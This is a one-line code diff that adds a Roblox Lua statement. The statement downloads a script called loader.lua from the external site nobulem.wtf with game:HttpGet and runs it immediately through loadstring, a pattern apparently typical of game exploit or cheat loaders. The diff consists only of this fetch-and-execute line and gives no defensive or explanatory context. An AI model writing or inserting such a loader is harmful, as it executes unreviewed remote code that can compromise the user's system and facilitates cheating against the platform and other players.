@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://nobulem.wtf/loader.lua"))()
